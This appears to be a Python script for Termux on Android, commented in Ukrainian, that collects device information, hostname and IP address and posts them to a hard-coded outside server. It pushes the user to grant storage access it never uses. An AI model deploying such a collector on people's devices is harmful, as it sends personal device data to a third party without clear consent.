#!/usr/bin/env python3
import os
import sys
import time
import json
import socket
import sqlite3
import requests
import subprocess
from datetime import datetime

# Конфігурація
API_URL = "https://dentalimpapp.com/api/v1/scanner"
DEVICE_ID = "termux-scanner-v1"
TIMEOUT = 30  # Збільшений таймаут для запитів

def check_storage_permission():
    """Перевіряємо чи надано доступ до сховища"""
    storage_path = os.path.expanduser('~/storage/shared')
    if os.path.exists(storage_path):
        print("[+] Доступ до сховища вже надано")
        return True
    
    print("[!] Запит дозволу на доступ до сховища...")
    print("[!] БУДЬ ЛАСКА, НАТИСНІТЬ 'ДОЗВОЛИТИ' У СПЛИВАЮЧОМУ ВІКНІ ANDROID!")
    
    try:
        subprocess.run(
            ["termux-setup-storage"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=30,  # Збільшений таймаут
            check=True
        )
        return True
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError) as e:
        print(f"[!!!] ПОМИЛКА: {str(e)}")
        print("[!!!] Виконайте вручну: termux-setup-storage")
        return False

def get_device_info():
    """Збираємо інформацію про пристрій"""
    try:
        # Отримуємо базову інформацію через Termux:API
        result = subprocess.run(
            ["termux-device-info"],
            capture_output=True,
            text=True,
            timeout=10
        )
        return json.loads(result.stdout) if result.returncode == 0 else {}
    except Exception as e:
        print(f"[!] Помилка отримання інформації: {str(e)}")
        return {}

def send_scan_results(data):
    """Відправляємо результати сканування на сервер"""
    try:
        headers = {"User-Agent": f"TermuxScanner/{DEVICE_ID}"}
        response = requests.post(
            API_URL,
            json=data,
            headers=headers,
            timeout=TIMEOUT
        )
        return response.status_code == 200
    except Exception as e:
        print(f"[!] Помилка відправки даних: {str(e)}")
        return False

def main():
    # Перевірка дозволів
    if not check_storage_permission():
        print("[!!!] Скрипт зупинено. Без доступу до сховища робота неможлива.")
        sys.exit(1)
    
    # Збір даних
    device_data = get_device_info()
    scan_data = {
        "device_id": DEVICE_ID,
        "timestamp": datetime.now().isoformat(),
        "network": {
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname())
        },
        "device_info": device_data
    }
    
    print(f"[+] Сканування завершено: {len(device_data)} параметрів")
    
    # Відправка даних
    if send_scan_results(scan_data):
        print("[+] Дані успішно відправлено на сервер")
    else:
        print("[!] Не вдалося відправити дані")

if __name__ == "__main__":
    main()
